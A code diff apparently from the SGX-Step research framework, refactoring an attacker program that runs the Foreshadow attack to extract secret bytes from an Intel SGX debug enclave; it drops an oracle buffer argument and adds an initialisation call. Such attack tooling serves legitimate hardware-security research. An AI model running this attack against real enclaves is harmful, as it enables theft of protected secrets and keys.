@@ -32,8 +32,8 @@
 #include "libsgxstep/foreshadow.h"
 #include "libsgxstep/cache.h"
 
-#define DUMP_SSA            1
-#define ITER_RELOAD         1
+#define DUMP_SSA            0
+#define ITER_RELOAD         0
 #define SECRET_BYTES        64      /* read entire cache line */
 
 #define DEBUG_ENCLAVE	    1
@@ -42,7 +42,6 @@
 #define ENCLAVE_SO	"Enclave/encl.so"
 #define ENCLAVE_MODE 	DEBUG_ENCLAVE
 
-uint8_t *oracle = NULL;
 void *secret_ptr = NULL;
 void *secret_page = NULL;
 void *alias_ptr = NULL;
@@ -67,7 +66,7 @@ void fault_handler(int signal)
     fault_fired++;
 
     #if DUMP_SSA
-        if ( !(cur_byte = foreshadow_ssa(&shadow_gprsgx, alias_ssa_gprsgx, oracle)) )
+        if ( !(cur_byte = foreshadow_ssa(&shadow_gprsgx, alias_ssa_gprsgx)) )
         {
             /* restore access on trigger page to allow enclave to finish execution */
             printf("\n");
@@ -94,9 +93,6 @@ void attacker_config_runtime(void)
 
     register_enclave_info();
     print_enclave_info();
-
-    oracle = create_oracle_buffer();
-    info("oracle at %p", oracle);
 }
 
 void attacker_config_page_table(void)
@@ -132,7 +128,6 @@ void attacker_config_page_table(void)
 void attacker_restore_runtime(void)
 {
     restore_system_state();
-    destroy_oracle_buffer(oracle);
 }
 
 /* ================== ATTACKER MAIN ================= */
@@ -152,6 +147,7 @@ int main( int argc, char **argv )
     /* configure attack untrusted runtime */
     attacker_config_runtime();
     attacker_config_page_table();
+    foreshadow_init();
 
     /* enter enclave and extract secrets */
     info_event("Foreshadow secret extraction");
@@ -164,7 +160,7 @@ int main( int argc, char **argv )
         #if ITER_RELOAD
             SGX_ASSERT( enclave_reload( eid, secret_ptr ) );
         #endif
-        recovered[i] = foreshadow(alias_ptr+i, oracle);
+        recovered[i] = foreshadow(alias_ptr+i);
     }
 
     info("verifying and destroying enclave secret..");
